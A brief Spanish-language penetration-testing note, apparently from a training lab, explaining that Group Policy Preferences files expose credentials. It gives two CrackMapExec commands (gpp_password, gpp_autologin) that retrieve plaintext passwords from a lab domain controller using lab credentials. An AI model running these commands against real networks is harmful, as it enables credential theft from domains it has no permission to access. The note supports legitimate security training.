# Intro

Muchas GPOs tienen datos de usuarios y usualmente pueden ser leídas por todos los users.

CME tiene dos módulos para esto:

gpp_password = busca passwords y las trae en plaintext

gpp_autologin = busca en el DC el registry.xml y trae passwords y users en plaintext.


## GPP_PASSWORD

    crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! -M gpp_password
## GPP_AUTOLOGIN
    crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! -M gpp_autologin
